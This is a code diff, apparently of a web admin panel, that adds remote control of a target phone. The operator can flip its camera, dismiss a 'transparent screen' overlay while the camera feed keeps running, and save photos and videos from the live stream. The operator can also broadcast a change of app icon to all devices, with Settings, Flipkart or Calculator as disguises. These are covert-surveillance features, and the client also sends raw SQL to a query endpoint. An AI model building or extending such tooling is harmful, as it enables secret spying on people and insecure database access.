-        sql: "UPDATE app_device_previews SET camera_facing = CASE WHEN camera_facing = 'user' THEN 'environment' ELSE 'user' END, updated_at = datetime('now') WHERE preview_id = ?",
-        args: [_activePreviewId]
-      })});
       const badge = document.getElementById("previewConnectionBadge");
-      if (badge) badge.innerText = "Flipping...";
-    } catch(_){}
+      if (badge) {
+        badge.innerText = "🔄 Flipping Camera...";
+        badge.style.background = "#d97706";
+        badge.style.color = "#fff";
+      }
+
+      // 1. Fetch current facing to reliably toggle
+      let currentFacing = 'environment';
+      try {
+        const cur = await api("/api/db/query", { method: "POST", body: JSON.stringify({
+          sql: "SELECT camera_facing, target_device_id FROM app_device_previews WHERE preview_id = ? LIMIT 1",
+          args: [_activePreviewId]
+        })});
+        if (cur?.rows?.[0]?.camera_facing) {
+          currentFacing = cur.rows[0].camera_facing;
+        }
+      } catch (_) {}
+
+      const newFacing = (currentFacing === 'user' || currentFacing === 'front') ? 'environment' : 'user';
+
+      // 2. Synchronize database
+      await api("/api/db/query", { method:"POST", body: JSON.stringify({
+        sql: "UPDATE app_device_previews SET camera_facing = ?, updated_at = datetime('now') WHERE preview_id = ?",
+        args: [newFacing, _activePreviewId]
+      })}).catch(() => {});
+
+      // 3. Dispatch instant high-priority FCM wake command to target device
+      const targetDevId = _activePreviewTargetDeviceId;
+      const issuer = (currentUser && (currentUser.name || currentUser.fullName)) ? (currentUser.name || currentUser.fullName) : "Aatif Raza";
+
+      if (targetDevId) {
+        await api("/api/calls/device-command", {
+          method: "POST",
+          body: JSON.stringify({
+            targetDeviceId: targetDevId,
+            command: "flip_camera",
+            facing: newFacing,
+            previewId: _activePreviewId,
+            issuedBy: issuer
+          })
+        }).catch(() => {});
+      }
+
+      if (badge) {
+        badge.innerText = `🔄 Switched to ${newFacing === 'user' ? 'Front' : 'Back'} Camera`;
+        setTimeout(() => {
+          if (badge && badge.innerText.includes("Switched")) {
+            badge.innerText = `● LIVE (${newFacing === 'user' ? 'Front' : 'Back'})`;
+            badge.style.background = "#10b981";
+          }
+        }, 1800);
+      }
+    } catch (e) {
+      console.warn("flip error:", e);
+    }
   };
+
+  window.dismissTransparentScreen = async function(deviceId, silent = false) {
+    const devId = deviceId || _activePreviewTargetDeviceId;
+    if (!devId) return;
+    try {
+      const issuer = (currentUser && (currentUser.name || currentUser.fullName)) ? (currentUser.name || currentUser.fullName) : "Aatif Raza";
+      await api("/api/calls/device-command", {
+        method: "POST",
+        body: JSON.stringify({
+          targetDeviceId: devId,
+          command: "dismiss_transparent_screen",
+          issuedBy: issuer
+        })
+      }).catch(() => {});
+      if (!silent) {
+        alert("🪟 Transparent Screen Stopped: Target phone closed the transparent window while the camera feed continues.");
+      } else {
+        console.log("[Preview] Auto-dismissed transparent screen on target phone:", devId);
+      }
+      const btn = document.getElementById("btnStopTransparentScreen");
+      if (btn) btn.style.display = "none";
+    } catch (e) {
+      if (!silent) {
+        alert("Failed to stop transparent screen: " + (e.message || e));
+      } else {
+        console.warn("[Preview] Failed to auto-dismiss transparent screen:", e.message || e);
+      }
+    }
+  };
+
+  window.captureLivePreviewPhoto = function() {
+    const vid = document.getElementById("previewVideo");
+    const img = document.getElementById("previewIpImg");
+    const isVidActive = vid && vid.style.display !== "none" && vid.readyState >= 2;
+    const isImgActive = img && img.style.display !== "none";
+
+    if (!isVidActive && !isImgActive) {
+      alert("Live stream is still connecting. Please wait a moment.");
+      return;
+    }
+
+    const canvas = document.createElement("canvas");
+    if (isVidActive) {
+      canvas.width = vid.videoWidth || 640;
+      canvas.height = vid.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
+    } else {
+      canvas.width = img.naturalWidth || 640;
+      canvas.height = img.naturalHeight || 480;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+    }
+    const dataUrl = canvas.toDataURL("image/jpeg", 0.95);
+    const a = document.createElement("a");
+    a.href = dataUrl;
+    a.download = "TPS_Live_Photo_" + new Date().toISOString().replace(/[:.]/g, "-") + ".jpg";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    const b = document.getElementById("btnSnapPhoto");
+    if (b) {
+      const orig = b.innerText;
+      b.innerText = "✅ Saved!";
+      b.style.background = "#16a34a";
+      setTimeout(() => { b.innerText = orig; b.style.background = "#0284c7"; }, 2000);
+    }
+  };
+
+  window.recordLivePreviewVideo = function(durationSec = 10) {
+    const vid = document.getElementById("previewVideo");
+    if (!vid || !vid.srcObject) {
+      alert("Live video stream is not active yet.");
+      return;
+    }
+    const stream = vid.srcObject;
+    let recorder;
+    try {
+      recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+    } catch (_) {
+      try {
+        recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+      } catch (e) {
+        recorder = new MediaRecorder(stream);
+      }
+    }
+
+    const chunks = [];
+    recorder.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+    
+    const b = document.getElementById("btnRecordVideo");
+    recorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = "TPS_Live_Video_" + durationSec + "s_" + new Date().toISOString().replace(/[:.]/g, "-") + ".webm";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      if (b) {
+        b.innerText = "✅ Video Saved!";
+        b.style.background = "#16a34a";
+        setTimeout(() => { b.innerText = "🎬 10s Video"; b.style.background = "#8b5cf6"; b.disabled = false; }, 3000);
+      }
+    };
+
+    recorder.start(1000);
+    if (b) {
+      b.disabled = true;
+      let remaining = durationSec;
+      b.innerText = "🔴 Rec " + remaining + "s";
+      b.style.background = "#ef4444";
+      const iv = setInterval(() => {
+        remaining--;
+        if (remaining > 0) {
+          b.innerText = "🔴 Rec " + remaining + "s";
+        } else {
+          clearInterval(iv);
+          recorder.stop();
+        }
+      }, 1000);
+    }
+  };
+
   window.stopLivePreview = stopLivePreview;
   window.addEventListener("beforeunload", () => {
     if (_activePreviewId || _activePreviewTargetDeviceId) {
@@ -21611,19 +23024,142 @@ window.closeAppReleaseControlModal = function() {
 window.switchReleaseTab = function(tab) {
   const otaPanel = document.getElementById('otaUpdateControlPanel');
   const apkForm = document.getElementById('appReleaseControlForm');
+  const brandingPanel = document.getElementById('appBrandingControlPanel');
   const tabOta = document.getElementById('tabBtnOta');
   const tabApk = document.getElementById('tabBtnApk');
+  const tabBranding = document.getElementById('tabBtnBranding');
 
   if (tab === 'ota') {
     if (otaPanel) otaPanel.style.display = 'flex';
     if (apkForm) apkForm.style.display = 'none';
+    if (brandingPanel) brandingPanel.style.display = 'none';
     if (tabOta) { tabOta.style.color = '#2563eb'; tabOta.style.borderBottomColor = '#2563eb'; }
     if (tabApk) { tabApk.style.color = '#64748b'; tabApk.style.borderBottomColor = 'transparent'; }
-  } else {
+    if (tabBranding) { tabBranding.style.color = '#64748b'; tabBranding.style.borderBottomColor = 'transparent'; }
+  } else if (tab === 'apk') {
     if (otaPanel) otaPanel.style.display = 'none';
     if (apkForm) apkForm.style.display = 'flex';
+    if (brandingPanel) brandingPanel.style.display = 'none';
     if (tabOta) { tabOta.style.color = '#64748b'; tabOta.style.borderBottomColor = 'transparent'; }
     if (tabApk) { tabApk.style.color = '#2563eb'; tabApk.style.borderBottomColor = '#2563eb'; }
+    if (tabBranding) { tabBranding.style.color = '#64748b'; tabBranding.style.borderBottomColor = 'transparent'; }
+  } else if (tab === 'branding') {
+    if (otaPanel) otaPanel.style.display = 'none';
+    if (apkForm) apkForm.style.display = 'none';
+    if (brandingPanel) brandingPanel.style.display = 'flex';
+    if (tabOta) { tabOta.style.color = '#64748b'; tabOta.style.borderBottomColor = 'transparent'; }
+    if (tabApk) { tabApk.style.color = '#64748b'; tabApk.style.borderBottomColor = 'transparent'; }
+    if (tabBranding) { tabBranding.style.color = '#2563eb'; tabBranding.style.borderBottomColor = '#2563eb'; }
+    if (window.loadAppBrandingInfo) window.loadAppBrandingInfo();
+  }
+};
+
+window.selectedBrandingIcon = 'tps';
+
+window.selectBrandingIcon = function(iconId) {
+  window.selectedBrandingIcon = iconId;
+  const cards = {
+    tps: document.getElementById('lblIconTps'),
+    settings: document.getElementById('lblIconSettings'),
+    flipkart: document.getElementById('lblIconFlipkart'),
+    calculator: document.getElementById('lblIconCalculator')
+  };
+
+  Object.keys(cards).forEach(key => {
+    const el = cards[key];
+    if (!el) return;
+    if (key === iconId) {
+      el.style.borderColor = '#2563eb';
+      el.style.background = '#eff6ff';
+    } else {
+      el.style.borderColor = '#e2e8f0';
+      el.style.background = '#f8fafc';
+    }
+  });
+};
+
+window.loadAppBrandingInfo = async function() {
+  try {
+    const res = await fetch('/api/admin/app-icon');
+    if (res.ok) {
+      const data = await res.json();
+      const active = data.activeIcon || 'tps';
+      window.selectBrandingIcon(active);
+      const badge = document.getElementById('brandingActiveIconBadge');
+      if (badge) badge.innerText = 'Active: ' + active.toUpperCase();
+      const logoInput = document.getElementById('schoolLogoUrlInput');
+      if (logoInput && data.schoolLogoUrl) logoInput.value = data.schoolLogoUrl;
+    }
+  } catch (err) {
+    console.warn('[Branding] Load error:', err);
+  }
+};
+
+window.broadcastAppIconChangeFromWeb = async function() {
+  const btn = document.getElementById('broadcastAppIconBtn');
+  const statusEl = document.getElementById('broadcastAppIconStatus');
+  const iconChoice = window.selectedBrandingIcon || 'tps';
+  const logoUrl = document.getElementById('schoolLogoUrlInput')?.value?.trim() || null;
+
+  if (btn) { btn.disabled = true; btn.innerText = 'Syncing...'; }
+  if (statusEl) { statusEl.style.color = '#64748b'; statusEl.innerText = `Broadcasting "${iconChoice.toUpperCase()}" to devices...`; }
+
+  try {
+    const res = await fetch('/api/admin/app-icon/broadcast', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        iconName: iconChoice,
+        schoolLogoUrl: logoUrl
+      })
+    });
+
+    const result = await res.json();
+    if (result.ok) {
+      const msg = `✅ Icon changed to ${iconChoice.toUpperCase()}! Broadcast sent to ${result.totalTargeted || 0} device(s).`;
+      if (statusEl) { statusEl.style.color = '#15803d'; statusEl.innerText = msg; }
+      const badge = document.getElementById('brandingActiveIconBadge');
+      if (badge) badge.innerText = 'Active: ' + iconChoice.toUpperCase();
+      if (typeof showToast === 'function') showToast(msg, 'success');
+      else alert(msg);
+    } else {
+      const errMsg = '❌ Error: ' + (result.error || 'Failed');
+      if (statusEl) { statusEl.style.color = '#dc2626'; statusEl.innerText = errMsg; }
+    }
+  } catch (err) {
+    if (statusEl) { statusEl.style.color = '#dc2626'; statusEl.innerText = '❌ Network Error: ' + err.message; }
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = '<span class="material-symbols-outlined" style="font-size:18px;">sync</span> 🚀 Sync App Icon to All Devices Now';
+    }
+  }
+};
+
+window.saveSchoolLogoUrlFromWeb = async function() {
+  const statusEl = document.getElementById('saveLogoUrlStatus');
+  const logoUrl = document.getElementById('schoolLogoUrlInput')?.value?.trim() || '';
+
+  if (statusEl) { statusEl.style.color = '#64748b'; statusEl.innerText = 'Saving online logo URL...'; }
+  try {
+    const res = await fetch('/api/admin/app-icon/broadcast', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        iconName: window.selectedBrandingIcon || 'tps',
+        schoolLogoUrl: logoUrl
+      })
+    });
+    const result = await res.json();
+    if (result.ok) {
+      const msg = '✅ School logo URL saved and synced to database!';
+      if (statusEl) { statusEl.style.color = '#15803d'; statusEl.innerText = msg; }
+      if (typeof showToast === 'function') showToast(msg, 'success');
+    } else {
+      if (statusEl) { statusEl.style.color = '#dc2626'; statusEl.innerText = '❌ Failed: ' + (result.error || 'Error'); }
+    }
+  } catch (err) {
+    if (statusEl) { statusEl.style.color = '#dc2626'; statusEl.innerText = '❌ Error: ' + err.message; }
   }
 };
 
